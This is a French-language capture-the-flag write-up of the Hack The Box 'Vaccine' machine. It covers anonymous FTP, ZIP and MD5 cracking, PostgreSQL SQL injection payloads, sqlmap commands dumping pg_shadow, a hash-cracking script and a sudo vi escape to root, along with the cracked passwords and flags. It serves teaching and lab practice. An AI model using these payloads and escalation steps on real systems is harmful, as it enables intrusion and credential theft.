---
title: HTB — Vaccine
date: 2026-05-15
platform: Hack The Box
difficulty: Easy
os: Linux
status: Pwned ✅
tags:
  - htb
  - ctf
  - linux
  - ftp
  - sqli
  - postgresql
  - privesc
  - vi
  - sqlmap
  - zip2john
  - john
ip: 10.129.95.174
flags:
  user: ec9b13ca4d6229cd5cc1e09980965bf7
  root: dd6e058e814260bc70e9bbdef2715849
---

# HTB — Vaccine 🧪

## Résumé

> Machine Linux Easy. Accès FTP anonyme → ZIP protégé cracké → credentials en clair dans PHP → SQLi PostgreSQL → shell SSH → privesc via `sudo vi`.

---

## 1. Reconnaissance

### Scan rapide

```bash
nmap 10.129.95.174
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Scan complet avec versions

```bash
nmap -sV -sC -Pn -p- 10.129.95.174
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

Trois services exposés : **FTP (21)**, **SSH (22)**, **HTTP (80)**.

---

## 2. FTP — Accès anonyme

```bash
ftp 10.129.95.174
# Login : anonymous / anonymous
```

Connexion réussie avec les credentials par défaut `anonymous:anonymous`.

![FTP Connexion anonyme](images/01-ftp-connexion.png)

Un fichier `backup.zip` est présent sur le serveur. On le récupère :

![FTP get backup.zip](IMG-20260613153735096.png)

---

## 3. Crack du ZIP

En essayant de dézipper le fichier, on voit qu'il est protégé par un mot de passe :

![ZIP protégé par mot de passe](IMG-20260613153735143.png)

On utilise `zip2john` pour extraire le hash puis `john` avec la wordlist `rockyou` :

```bash
zip2john backup.zip > crackeme.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crackeme.txt
```

Première tentative échouée (rockyou non décompressé) :

![zip2john + john première tentative](IMG-20260613153735188.png)

Après décompression de rockyou, le mot de passe est trouvé :

![ZIP cracké avec succès](IMG-20260613153735207.png)

> **Mot de passe ZIP : `741852963`**

---

## 4. Analyse du contenu du ZIP

Après extraction, deux fichiers : `index.php` et `style.css`.

Le fichier `index.php` contient les credentials admin en clair :

![Credentials dans index.php](IMG-20260613153735232.png)

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

> **Hash MD5 : `2cb42f8734ea607eefed3b70af13bbd3`**

Identification du type de hash avec `hashid` :

![hashid sur le hash MD5](IMG-20260613153735271.png)

Crack du hash via crackstation.net :

![Hash MD5 cracké → qwerty789](IMG-20260613153735294.png)

> **Mot de passe admin : `qwerty789`**

---

## 5. Enumération Web (Port 80)

### Page de login — MegaCorp

![Page de login MegaCorp](IMG-20260613153735313.png)

### Code source — Informations intéressantes

Analyse du code source de la page :

![Code source avec commentaires](IMG-20260613153735338.png)

Les commentaires HTML révèlent l'utilisation d'un **moteur de templates** :

```html
<!-- partial:index.partial.html -->
...
<!-- partial -->
```

### Connexion au dashboard

Connexion avec `admin:qwerty789` → accès au dashboard `/dashboard.php` :

![Dashboard MegaCorp Car Catalogue](IMG-20260613153735355.png)

La barre de recherche sur le catalogue de voitures est un vecteur potentiel de **SQL Injection**.

---

## 6. SQL Injection

### 6.1 Détection

Test avec un guillemet simple `'` dans la barre de recherche :

![Erreur SQLi avec apostrophe](IMG-20260613153735374.png)

```
ERROR: unterminated quoted string at or near ""
LINE 1: Select * from cars where name ilike '%%'
```

L'erreur confirme une **SQLi directe non filtrée** sur PostgreSQL.

### 6.2 Enumération des colonnes

Test avec `UNION SELECT` pour déterminer le nombre de colonnes :

```sql
' UNION SELECT 1,2,3,4-- -
```

![Erreur nombre de colonnes](IMG-20260613153735434.png)

```
ERROR: each UNION query must have the same number of columns
```

Après ajustement à 5 colonnes avec NULL :

```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
```

![UNION SELECT NULL — succès](IMG-20260613153735453.png)

> **5 colonnes confirmées**, SGBD **PostgreSQL**.

### 6.3 Exploitation avec SQLMap

Utilisation de SQLMap avec le cookie de session :

#### Extraction des bases de données

```bash
sqlmap -u "http://10.129.95.174/dashboard.php/?search=car" \
  --cookie="PHPSESSID=56v3i0c51hm5rfijiebl6lp20f" \
  --dbs --batch
```

```
[*] information_schema
[*] pg_catalog
[*] public
```

#### Extraction du hash PostgreSQL via pg_shadow

```bash
sqlmap -u "http://10.129.95.174/dashboard.php/?search=car" \
  --cookie="PHPSESSID=56v3i0c51hm5rfijiebl6lp20f" \
  --dbms=postgresql \
  --sql-query="SELECT usename,passwd FROM pg_shadow" \
  --batch
```

```
postgres : md52d58e0637ec1e94cdfba3d1c26b67d01
```

#### Crack du hash PostgreSQL

Le hash PostgreSQL est calculé ainsi : `md5(password + username)`

```bash
python3 -c "
import hashlib
target = '2d58e0637ec1e94cdfba3d1c26b67d01'
with open('/usr/share/wordlists/rockyou.txt','rb') as f:
    for line in f:
        word = line.strip()
        if hashlib.md5(word + b'postgres').hexdigest() == target:
            print('[+] Found:', word.decode())
            break
"
```

> **Mot de passe postgres : `P@s5w0rd!`**

---

## 7. Accès initial — User Flag

```bash
ssh postgres@10.129.95.174
# password: P@s5w0rd!

cat ~/user.txt
```

> 🚩 **User Flag : `ec9b13ca4d6229cd5cc1e09980965bf7`**

---

## 8. Privilege Escalation

### 8.1 Enumération sudo

```bash
sudo -l
```

```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

### 8.2 Exploitation via GTFOBins — vi

`vi` permet l'exécution de commandes depuis son interface avec `:!cmd`. Lancé en `sudo`, on obtient un shell root :

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Dans vi, taper :

```
:!bash
```

```bash
whoami        # root
cat /root/root.txt
```

> 🚩 **Root Flag : `dd6e058e814260bc70e9bbdef2715849`**

---

## 9. Kill Chain

```
[FTP anonyme]
    └── backup.zip
         └── zip2john + john → 741852963
              └── index.php → MD5 admin
                   └── crackstation → qwerty789
                        └── [Dashboard]
                             └── SQLi PostgreSQL (search)
                                  └── SQLMap → pg_shadow
                                       └── P@s5w0rd!
                                            └── [SSH postgres]
                                                 └── user.txt ✅
                                                      └── sudo vi → :!bash
                                                           └── root.txt ✅
```

---

## 10. Leçons apprises

- **FTP anonyme** est toujours à tester en premier
- Les **archives ZIP** peuvent contenir des sources avec credentials en clair
- Les **commentaires HTML** révèlent la stack technique
- **SQLMap + cookie de session** est efficace sur les dashboards authentifiés
- `pg_shadow` contient les hash MD5 PostgreSQL — format `md5(pass + username)`
- **GTFOBins** : `vi` en sudo → `:!bash` = root immédiat
- Toujours vérifier `sudo -l` en premier lors de l'énumération privesc

---

## 11. Références

- [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/)
- [SQLMap Documentation](https://sqlmap.org)
- [HackTricks — PostgreSQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection)
- [CrackStation](https://crackstation.net)
